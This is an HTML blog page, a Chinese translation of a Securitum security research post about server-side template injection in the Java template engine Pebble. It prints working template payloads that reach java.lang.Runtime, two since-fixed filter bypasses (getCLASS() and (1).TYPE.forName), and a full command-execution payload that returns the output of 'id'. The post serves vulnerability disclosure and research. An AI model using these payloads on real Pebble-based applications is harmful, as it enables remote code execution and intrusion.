@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="原文地址：https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/  服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的一篇博客才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-Peb">
+<meta name="keywords" content="安全,模板注入,Pebble">
+<meta property="og:type" content="article">
+<meta property="og:title" content="翻译|Pebble中的服务端模板注入">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="原文地址：https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/  服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的一篇博客才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-Peb">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/09/pebble-exploit.png">
+<meta property="og:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/09/scrrenshot.png">
+<meta property="og:updated_time" content="2019-10-08T14:16:17.939Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="翻译|Pebble中的服务端模板注入">
+<meta name="twitter:description" content="原文地址：https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/  服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的一篇博客才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-Peb">
+<meta name="twitter:image" content="https://research.securitum.com/wp-content/uploads/sites/2/2019/09/pebble-exploit.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>翻译|Pebble中的服务端模板注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/10/08/CSE-CIC-IDS2018 on AWS[翻译]/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/10/08/Handshake：利用分布式的DNS增强互联网的安全[翻译]/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&text=翻译|Pebble中的服务端模板注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&is_video=false&description=翻译|Pebble中的服务端模板注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=翻译|Pebble中的服务端模板注入&body=Check out this article: https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&name=翻译|Pebble中的服务端模板注入&description=&lt;blockquote&gt;
+&lt;p&gt;原文地址：&lt;a href=&#34;https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的&lt;a href=&#34;https://portswigger.net/blog/server-side-template-injection&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;一篇博客&lt;/a&gt;才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-&lt;a href=&#34;https://pebbletemplates.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Pebble&lt;/a&gt;。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&t=翻译|Pebble中的服务端模板注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pebble-与模板注入"><span class="toc-number">1.</span> <span class="toc-text">Pebble 与模板注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#防止在Pebble中获得任意类实例"><span class="toc-number">2.</span> <span class="toc-text">防止在Pebble中获得任意类实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取命令输出-Java-9"><span class="toc-number">3.</span> <span class="toc-text">读取命令输出(Java 9+)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在Pebble上实践"><span class="toc-number">4.</span> <span class="toc-text">在Pebble上实践</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        翻译|Pebble中的服务端模板注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-10-07T16:00:00.000Z" itemprop="datePublished">2019-10-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/翻译/">翻译</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Pebble/">Pebble</a>, <a class="tag-link" href="/tags/安全/">安全</a>, <a class="tag-link" href="/tags/模板注入/">模板注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>原文地址：<a href="https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/" target="_blank" rel="noopener">https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/</a></p>
+</blockquote>
+<p>服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的<a href="https://portswigger.net/blog/server-side-template-injection" target="_blank" rel="noopener">一篇博客</a>才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-<a href="https://pebbletemplates.io/" target="_blank" rel="noopener">Pebble</a>。</p>
+<a id="more"></a>
+<h4 id="Pebble-与模板注入"><a href="#Pebble-与模板注入" class="headerlink" title="Pebble 与模板注入"></a>Pebble 与模板注入</h4><p>在官方介绍中，Pebble是一款受<em>Twig</em>启发的Java模板引擎。它具有模板继承和易于阅读的语法，内置自动转义以增强安全性，并包含对国际化的集成支持。它支持模板引擎中的一个通用语法，即变量替换使用<code>{参数}</code>完成。通常，在模板引擎中可以包含任意Java表达式。考虑一下，现在你有一个名为<code>name</code>的变量，你想在模板中输出其大写形式，你可以使用下面的语法实现。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;name.toUpperCase()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>在Java中各种表达式利用模板注入的通常方法是使用类似于下面的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variable.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getRuntime().exec(<span class="string">'ls -la'</span>)</span><br></pre></td></tr></table></figure>
+<p>基本上Java中的每一个对象都含有名为<code>getClass()</code>的方法，其可以得到一个特殊的对象<code>java.lang.Class</code>，通过它可以轻松的得到任意Java类的实例。通常的做法接下来会得到<code>java.lang.Runtime</code>的实例，利用它可以执行系统命令。</p>
+<p>第一次在Pebble上进行模板注时，代码和上面基本上一致，只不过需要在外面加上大括号。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; variable.getClass().forName(<span class="string">'java.lang.Runtime'</span>).getRuntime().exec(<span class="string">'ls -la'</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="防止在Pebble中获得任意类实例"><a href="#防止在Pebble中获得任意类实例" class="headerlink" title="防止在Pebble中获得任意类实例"></a>防止在Pebble中获得任意类实例</h4><p>Pebble的作者未来防止这种攻击，添加了防护手段，其阻止了对<code>getClass()</code>的方法调用。不过，最初有一个有趣的方法可以绕过它，因为Pebble在寻找表达式中的方法时采用了一种非常灵活的方式。对于下面的表达式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; someString.toUPPERCASE() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的表达式应该是不能生效，因为方法的名字不对，应该是<code>toUpperCase()</code>而不是<code>toUPPERCASE()</code>。不过，Pebble在方法或属性名称中忽略了大小写。所以对于上面的代码，可以正常的调用<code>toUpperCase()</code>方法。</p>
+<p>而当Pebble试图阻止对getClass()的访问时，它却检查了区分大小写的方法的名称。所以你可以使用下面的方式进行绕过。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; someString.getCLASS().forName(...) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这个问题在<a href="https://github.com/PebbleTemplates/pebble/issues/435" target="_blank" rel="noopener">2019年4月的3.0.9版</a>中通过不区分大小写得到了解决。</p>
+<p>在几个月后，我在研究其他一些与java相关的内容时注意到还有一种内置的方法可以访问<code>java.lang.Class</code>的实例。Java中的一些包装器类（wrapper classes），比如<code>java.lang.Integer</code>，其具有一个名为<code>TYPE</code>的字段，其类型为<code>java.lang.Class</code>!因此，可以用另一种形式来执行任意代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE.forName(...) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>我在<a href="https://github.com/PebbleTemplates/pebble/issues/454" target="_blank" rel="noopener">2019年7月向Pebble报告了这个问题</a>，管理用使用了与<code>FreeMarker</code>相同的方法修复了这个问题，即添加方法调用的黑名单。所以当我使用<code></code>时，<code>forName()</code>方法就被阻止，使其”不可能”执行任意代码。我在不可能上加了引号，因为我相信一定还存在其他的方式可以绕过，只是我还没有发现。这是一个有趣的研究领域。</p>
+<h4 id="读取命令输出-Java-9"><a href="#读取命令输出-Java-9" class="headerlink" title="读取命令输出(Java 9+)"></a>读取命令输出(Java 9+)</h4><p>虽然在Java中执行任意命令是很容易的，但是在出现服务器端模板注入之类的漏洞时，读取输出有时候会很困难。它通常通过遍历结果的<code>InputStream</code>或发送带外输出来实现。</p>
+<p>在研究Pebble时，我发现在Java 9+中事情变得容易多了，因为<code>InputStream</code>有一个方便的方法<code>readAllBytes</code>，它返回一个字节数组！<code>byte[]</code>可以通过<code>String</code>构造器转换为<code>String</code>！利用代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = <span class="string">'id'</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.Runtime'</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.String'</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>结果显示如下：</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/09/pebble-exploit.png" alt="result"></p>
+<h4 id="在Pebble上实践"><a href="#在Pebble上实践" class="headerlink" title="在Pebble上实践"></a>在Pebble上实践</h4><p>如果你希望在Pebble上进行测试，我们准备了一个<code>GitHub repo</code>，其中包含一个Docker容器，你可以在其中运行各种版本的Pebble。地址:<a href="https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble" target="_blank" rel="noopener">https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble</a>。</p>
+<p>你需要做的就是确保已经安装了<code>docker</code>和<code>docker-composition</code>，然后运行<code>docker- composition up</code>。web服务运行在<code>http://localhost:4567</code>。</p>
+<p><img src="https://research.securitum.com/wp-content/uploads/sites/2/2019/09/scrrenshot.png" alt="server"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Pebble与许多其他流行的模板引擎没有什么不同，如果你可以修改模板本身，那么你就可以在其中执行任意命令。所以我建议未经授权的用户永远不能修改模板。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Pebble-与模板注入"><span class="toc-number">1.</span> <span class="toc-text">Pebble 与模板注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#防止在Pebble中获得任意类实例"><span class="toc-number">2.</span> <span class="toc-text">防止在Pebble中获得任意类实例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#读取命令输出-Java-9"><span class="toc-number">3.</span> <span class="toc-text">读取命令输出(Java 9+)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#在Pebble上实践"><span class="toc-number">4.</span> <span class="toc-text">在Pebble上实践</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&text=翻译|Pebble中的服务端模板注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&is_video=false&description=翻译|Pebble中的服务端模板注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=翻译|Pebble中的服务端模板注入&body=Check out this article: https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&title=翻译|Pebble中的服务端模板注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&name=翻译|Pebble中的服务端模板注入&description=&lt;blockquote&gt;
+&lt;p&gt;原文地址：&lt;a href=&#34;https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;服务端模板注入在web应用中算不上一种新的漏洞。2015年詹姆斯·凯特尔(James Kettle)的&lt;a href=&#34;https://portswigger.net/blog/server-side-template-injection&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;一篇博客&lt;/a&gt;才让它被人所熟知。在这篇博客中，我将分享另一段经历，其中会涉及一个比较小众的Java模板引擎-&lt;a href=&#34;https://pebbletemplates.io/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Pebble&lt;/a&gt;。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/10/08/Pebble中的服务端模板注入[翻译]/&t=翻译|Pebble中的服务端模板注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
